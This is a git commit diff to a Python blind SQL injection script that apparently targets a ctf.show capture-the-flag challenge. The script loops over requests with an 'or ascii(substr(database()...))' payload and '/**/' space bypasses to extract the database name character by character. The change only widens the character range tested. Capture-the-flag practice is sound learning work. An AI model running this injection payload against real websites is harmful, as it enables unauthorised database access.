70890b16f9cfc813f224e6e1a6f18aab0513647b
whb54012 <1226844928@qq.com>
2026-07-21 11:43:53 +0000

    自动提交：更新 ${2026/7/21 19:43ilenPM43e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -5,7 +5,7 @@ word=""
 num=0
 url = "https://a71959e2-2471-42b2-893e-220d4132217a.challenge.ctf.show/index.php?id=0/**/or/**/"
 for num1 in range(1,8):
-    for num2 in range (65,123):
+    for num2 in range (47,123):
         data = "ascii(substr(database()/**/from/**/%d/**/for/**/1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False)
         if "If" in result.text:
